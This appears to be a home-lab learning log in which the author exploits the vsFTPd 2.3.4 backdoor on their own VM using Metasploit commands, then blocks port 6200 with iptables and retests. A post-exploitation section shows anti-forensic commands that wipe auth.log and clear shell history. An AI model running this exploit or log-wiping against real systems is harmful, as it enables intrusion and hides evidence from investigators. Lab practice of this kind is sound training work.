---
icon: terminal
cover: >-
  https://cdn.discordapp.com/attachments/1031890307979149332/1483977967347433593/image.png?ex=69c719ae&is=69c5c82e&hm=6854fc14aad09b748880a2d4c3d62b1c2faad6ce1177cc088657dc1e17cddb79
coverY: 0
coverHeight: 138
---

# Day 5 - vsFTPd 2.3.4

**Date:** 27.03.2026

**Focus:** Introduction to Exploitation, Metasploit Framework, and Anti-Forensics

Recently, I've been dabbling with various Metasploitable modules and exploitation concepts on TryHackMe, so it was finally time to bring those newly acquired skills into my own localized environment. The main goal of this room today was to understand the basics of exploitation by attacking and subsequently hardening a notoriously vulnerable service running on Austo-College: **vsFTPd 2.3.4**.

***

## Section 1: Weaponization & Tool Selection

vsFTPd 2.3.4 is infamous for containing a malicious backdoor that was slipped into the source code archive back in 2011. Triggering the backdoor is incredibly simple, but to streamline the process, I utilized the **Metasploit Framework** from my Kali Linux attacker machine.

```bash
# Launch the Metasploit Framework console
msfconsole
```

Once the framework initialized, I needed to locate the specific exploit module for this FTP daemon version.

```bash
# Search for modules related to vsftpd 2.3.4
msf6 > search vsftpd_234

# Select the appropriate exploit module
msf6 > use 0
```

***

## Section 2: Launching the Exploit

With the module loaded, I configured the payload to target Austo-College. The exploit involves sending a sequence ending in a smiley face `:)` in the FTP username, which triggers the daemon to open a root shell on port 6200.

```bash
# Set the Remote Host (RHOSTS) to Austo-College's static IP
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.138.100

# Execute the payload
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

Within seconds, the backdoor was triggered, and Metasploit successfully established a command shell session as the `root` user.

***

## Section 3: Post-Exploitation & Anti-Forensics

To validate the compromise, I navigated to the `austo` user directory. However, a real-world attacker doesn't just steal data; they perform **damage control** and **anti-forensics** to stay persistent and undetected.

```bash
# Verify root user access
whoami

# Navigate to the target user's home directory
cd /home/austo

# Append a taunt to the flag file
echo "Not so safe, are you? :)" >> flag.txt

# Clear the authentication logs to hide the login trail
echo "" | sudo tee /var/log/auth.log

# Clear the shell history to hide the commands used during the session
history -c
```

By clearing `auth.log` and the command history, I simulated the steps an intruder takes to make forensic reconstruction significantly harder for a Blue Team investigator.

***

## Section 4: Mitigation & Hardening

Now shifting to the defensive perspective, the vulnerability needed to be patched. While the most permanent solution would be to upgrade the vsFTPd package, a rapid SOC containment strategy was used to stop the active threat.

Since the vsFTPd 2.3.4 backdoor binds a rogue listener to **TCP Port 6200**, I implemented an `iptables` rule on Austo-College to block that specific port. Lastly, we removed the flag left by the attacker, restoring the system to its proper state.

```bash
# Drop all incoming TCP traffic attempting to connect to the backdoor port
sudo iptables -A INPUT -p tcp --dport 6200 -j DROP

# Save the configuration
sudo iptables-save > /etc/iptables/rules.v4

# Remove the flag
rm flag.txt
```

***

## Section 5: Verification (The Retest)

I pivoted back to the Kali machine and attempted to launch the exact same Metasploit attack against the now-hardened target.

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.138.100:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.138.100:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

The firewall rule successfully intercepted the connection. The attack failed, proving the basic vulnerability was mitigated.

***

## Summary of Progress

Today’s session demonstrated the full lifecycle of an attack, including the crucial step of covering one's tracks. This highlights why log integrity and off-site log streaming (which I plan to implement in Phase 3) are so vital.

**Key Achievements:**

* **Exploitation:** Successfully weaponized the vsFTPd 2.3.4 backdoor via Metasploit.
* **Anti-Forensics:** Performed simulated track-covering by clearing `auth.log` and shell history.
* **Damage Control:** Deleted the `flag.txt` artifact to simulate data loss.
* **Containment:** Deployed `iptables` to block the backdoor port (6200).
* **Validation:** Confirmed the mitigation successfully prevents shell establishment.
